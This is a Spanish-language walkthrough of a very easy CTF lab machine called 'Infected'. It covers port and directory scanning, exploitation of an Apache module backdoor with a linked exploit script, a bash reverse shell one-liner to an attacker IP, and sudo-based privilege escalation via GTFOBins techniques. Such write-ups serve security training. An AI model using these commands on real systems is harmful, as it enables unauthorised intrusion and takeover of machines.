---
description: '🔍 Dificultad: Muy Fácil'
---

# Infected

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 192.168.1.72
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (1109).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap -p- --open 192.168.1.72 --min-rate 5000 -n
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1110).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 192.168.1.72
```

para obtener más información sobre ese puerto específicamente.

<figure><img src="../../.gitbook/assets/image (1112).png" alt=""><figcaption></figcaption></figure>

Revisamos el puerto 80 que es la página por defecto de Apache.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-01-31 220259.png" alt=""><figcaption></figcaption></figure>

Revisamos directorios.

```bash
dirb http://192.168.1.72
```

<figure><img src="../../.gitbook/assets/image (1116).png" alt=""><figcaption></figcaption></figure>

Revisamos el **info.php**.

<figure><img src="../../.gitbook/assets/image (1117).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Revisando más a fondo encontramos que es un **Backdoor**.

<figure><img src="../../.gitbook/assets/image (1118).png" alt=""><figcaption></figcaption></figure>

{% @github-files/github-code-block url="https://github.com/WangYihang/Apache-HTTP-Server-Module-Backdoor/blob/main/exploit.py" %}

Ejecutamos.

```bash
./exploit.py 192.168.1.72 80
```

Lanzamos un RCE.

```bash
bash -c "bash -i >& /dev/tcp/192.168.1.65/443 0>&1"
```

<figure><img src="../../.gitbook/assets/image (1120).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1121).png" alt=""><figcaption></figcaption></figure>

### 🔐 PRIVILEGIOS

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar.

<figure><img src="../../.gitbook/assets/image (1119).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://gtfobins.github.io/gtfobins/service/#sudo" %}

```bash
sudo -u laurent /usr/sbin/service ../../bin/sh
```

{% embed url="https://gtfobins.github.io/gtfobins/joe/#sudo" %}

```bash
sudo /usr/bin/joe
^K!/bin/bash
```

<figure><img src="../../.gitbook/assets/image (1122).png" alt=""><figcaption></figcaption></figure>
